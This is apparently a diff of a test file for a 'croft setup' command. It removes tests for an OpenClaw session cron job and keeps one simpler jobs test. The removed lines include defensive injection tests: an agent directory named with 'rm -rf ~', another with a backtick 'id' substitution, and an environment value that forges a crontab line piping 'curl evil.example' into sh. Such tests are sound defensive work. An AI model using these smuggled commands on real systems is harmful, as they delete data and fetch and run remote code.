@@ -161,123 +161,23 @@ describe('croft setup — dry run', () => {
 })
 
 /**
- * CROFT-316: OpenClaw has no session-end event, so `openclaw-sessions`
- * (scripts/install-cron.mjs) is the only thing that ever records its
- * transcripts — `croft setup` installs it for you wherever it can work out
- * the sessions directory. Dry-run only here: --install would run real
- * launchctl, which this suite must never do.
+ * Croft records no sessions — Cairn does — so setup plans only the agent-files
+ * job, and reconcile with --maintenance. Dry-run only: --install would run
+ * real launchctl, which this suite must never do.
  */
-describe('croft setup — openclaw-sessions job', () => {
-  it('includes openclaw-sessions with the derived directory when it can find one', async () => {
-    const base = await serve()
-    const HOME = await home()
-    const { mkdir, writeFile } = await import('node:fs/promises')
-    const sessions = join(HOME, '.openclaw', 'agents', 'main', 'agent', 'codex-home', 'sessions')
-    await mkdir(sessions, { recursive: true })
-    await mkdir(join(HOME, '.croft', 'hooks'), { recursive: true })
-    await writeFile(join(HOME, '.croft', 'hooks', 'croft-session-end.mjs'), '// stub\n')
-
-    const { code, stdout } = await run(
-      ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
-      HOME,
-    )
-    expect(code).toBe(0)
-    expect(stdout).toContain('jobs      agent-files, openclaw-sessions (plan)')
-    expect(stdout).toContain(sessions)
-  })
-
-  it('skips openclaw-sessions with a clear line when no sessions directory can be found', async () => {
-    const base = await serve()
-    const HOME = await home()
-    const { code, stdout } = await run(
-      ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
-      HOME,
-    )
-    expect(code).toBe(0)
-    expect(stdout).toContain('! jobs      openclaw-sessions skipped')
-    expect(stdout).toContain('set CROFT_OPENCLAW_SESSIONS=<dir> and re-run')
-    expect(stdout).toContain('CROFT_OPENCLAW_SESSIONS=')
-    expect(stdout).not.toContain('agent-files, openclaw-sessions')
-  })
-
-  it('honours an already-set CROFT_OPENCLAW_SESSIONS instead of deriving one', async () => {
-    const base = await serve()
-    const HOME = await home()
-    const { mkdir, writeFile } = await import('node:fs/promises')
-    const custom = join(HOME, 'custom-sessions')
-    await mkdir(custom, { recursive: true })
-    await mkdir(join(HOME, '.croft', 'hooks'), { recursive: true })
-    await writeFile(join(HOME, '.croft', 'hooks', 'croft-session-end.mjs'), '// stub\n')
-
-    const { code, stdout } = await run(
-      ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
-      HOME,
-      { CROFT_OPENCLAW_SESSIONS: custom },
-    )
-    expect(code).toBe(0)
-    expect(stdout).toContain('jobs      agent-files, openclaw-sessions (plan)')
-    expect(stdout).toContain(custom)
-  })
-
-  /**
-   * F2: an agent name under ~/.openclaw/agents/ is never typed by a person —
-   * it is whatever that directory happens to be named — and it used to flow
-   * straight into a path this file hands to install-cron.mjs, which renders
-   * it into a crontab line. A name is not a thing this file can control, so
-   * it is checked against a plain allowlist before it is trusted at all.
-   */
-  it('ignores an agent name that is not plain letters, digits, dots, dashes or underscores', async () => {
+describe('croft setup — jobs', () => {
+  it('plans agent-files alone, never a session sweep, even for OpenClaw', async () => {
     const base = await serve()
     const HOME = await home()
     const { mkdir } = await import('node:fs/promises')
-    // Not `main`: an unsafe name must be ignored even when it would otherwise
-    // be the one candidate, not merely lose a tie to a safe `main`.
-    await mkdir(join(HOME, '.openclaw', 'agents', 'evil; rm -rf ~', 'agent', 'codex-home', 'sessions'), { recursive: true })
-
+    await mkdir(join(HOME, '.openclaw', 'agents', 'main', 'agent', 'codex-home', 'sessions'), { recursive: true })
     const { code, stdout } = await run(
       ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
       HOME,
     )
     expect(code).toBe(0)
-    expect(stdout).toContain('! jobs      openclaw-sessions skipped')
-    expect(stdout).toContain('ignored 1 agent name(s)')
-    expect(stdout).not.toContain('evil; rm -rf ~')
-  })
-
-  it('picks the one safely-named agent over an unsafely-named one with sessions too', async () => {
-    const base = await serve()
-    const HOME = await home()
-    const { mkdir, writeFile } = await import('node:fs/promises')
-    const sessions = join(HOME, '.openclaw', 'agents', 'work-agent.1', 'agent', 'codex-home', 'sessions')
-    await mkdir(sessions, { recursive: true })
-    await mkdir(join(HOME, '.openclaw', 'agents', 'evil`id`', 'agent', 'codex-home', 'sessions'), { recursive: true })
-    await mkdir(join(HOME, '.croft', 'hooks'), { recursive: true })
-    await writeFile(join(HOME, '.croft', 'hooks', 'croft-session-end.mjs'), '// stub\n')
-
-    const { code, stdout } = await run(
-      ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
-      HOME,
-    )
-    expect(code).toBe(0)
-    expect(stdout).toContain('jobs      agent-files, openclaw-sessions (plan)')
-    expect(stdout).toContain(sessions)
-  })
-
-  /**
-   * F2: the operator-set override is a plain env var, so nothing stops it
-   * from carrying a `%` (cron's own newline escape, crontab(5)) or an actual
-   * newline before it ever reaches install-cron.mjs's rendering.
-   */
-  it('refuses a CROFT_OPENCLAW_SESSIONS override that could forge a crontab line', async () => {
-    const base = await serve()
-    const HOME = await home()
-    const { code, stdout, stderr } = await run(
-      ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
-      HOME,
-      { CROFT_OPENCLAW_SESSIONS: '/tmp/x%* * * * * curl evil.example|sh' },
-    )
-    expect(code).toBe(0) // setup itself still finishes; the failing sub-step is reported, not fatal
-    expect(`${stdout}${stderr}`).toContain('CROFT_OPENCLAW_SESSIONS contains a newline, carriage return or %')
+    expect(stdout).not.toContain('openclaw-sessions')
+    expect(stdout).not.toContain('vitals')
   })
 })
 
